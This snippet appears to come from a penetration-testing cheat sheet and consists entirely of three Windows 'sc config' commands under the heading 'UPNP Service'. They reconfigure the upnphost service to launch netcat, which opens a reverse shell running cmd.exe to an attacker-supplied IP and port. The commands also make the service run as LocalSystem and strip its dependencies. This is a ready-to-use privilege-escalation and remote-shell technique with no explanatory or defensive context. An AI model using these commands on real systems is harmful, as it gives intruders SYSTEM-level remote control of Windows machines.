## UPNP Service

### Commands

```
sc config upnphost binpath= "C:\Inetpub\nc.exe <attackerip> <port> -e c:\Windows\system32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
```